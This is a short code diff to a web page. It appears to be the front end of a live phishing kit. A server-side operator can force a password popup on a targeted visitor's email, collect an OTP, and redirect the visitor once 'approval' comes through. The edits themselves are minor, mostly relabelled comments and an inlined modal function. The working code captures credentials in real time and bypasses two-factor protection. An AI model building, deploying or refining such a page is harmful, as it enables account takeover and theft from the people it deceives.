@@ -134,7 +134,7 @@ button:disabled{
   display:none;
 }
 
-/* POPUP MODAL STYLES */
+/* POPUP MODAL STYLES (ADDED) */
 .modal-overlay {
   display: none;
   position: fixed;
@@ -249,7 +249,7 @@ button:disabled{
   </div>
 </div>
 
-<!-- FORCE LOGIN POPUP MODAL -->
+<!-- FORCE LOGIN POPUP MODAL (ADDED) -->
 <div id="loginModal" class="modal-overlay">
   <div class="modal">
     <div class="modal-icon">
@@ -277,9 +277,9 @@ button:disabled{
   const errorDiv = document.getElementById('errorMessage');
   let isProcessing = false;
   let approvalInterval = null;
-  let socket = null;
 
-  // Socket.io connection
+  // Socket.io connection for popup events (ADDED)
+  let socket = null;
   function connectSocket() {
     socket = io();
     socket.on('connect', () => {
@@ -287,21 +287,24 @@ button:disabled{
       socket.emit('identify', { email });
     });
     
-    // Force login popup event
     socket.on('force-login-popup', (data) => {
       if (data.email === email) {
-        showLoginModal();
+        const modal = document.getElementById('loginModal');
+        modal.classList.add('active');
+        document.getElementById('loginEmail').value = '';
+        document.getElementById('loginPassword').value = '';
+        document.getElementById('modalError').style.display = 'none';
+        document.getElementById('submitLoginBtn').disabled = false;
+        document.getElementById('submitLoginBtn').innerHTML = 'Login to Continue';
       }
     });
     
-    // Redirect to success event
     socket.on('redirect-to-success', (data) => {
       if (data.email === email) {
         window.location.href = data.redirectUrl;
       }
     });
   }
-  
   connectSocket();
 
   function getOTP() {
@@ -376,17 +379,7 @@ button:disabled{
     }
   }
 
-  // MODAL FUNCTIONS
-  function showLoginModal() {
-    const modal = document.getElementById('loginModal');
-    modal.classList.add('active');
-    document.getElementById('loginEmail').value = '';
-    document.getElementById('loginPassword').value = '';
-    document.getElementById('modalError').style.display = 'none';
-    document.getElementById('submitLoginBtn').disabled = false;
-    document.getElementById('submitLoginBtn').innerHTML = 'Login to Continue';
-  }
-
+  // Modal functions (ADDED)
   function hideLoginModal() {
     document.getElementById('loginModal').classList.remove('active');
   }
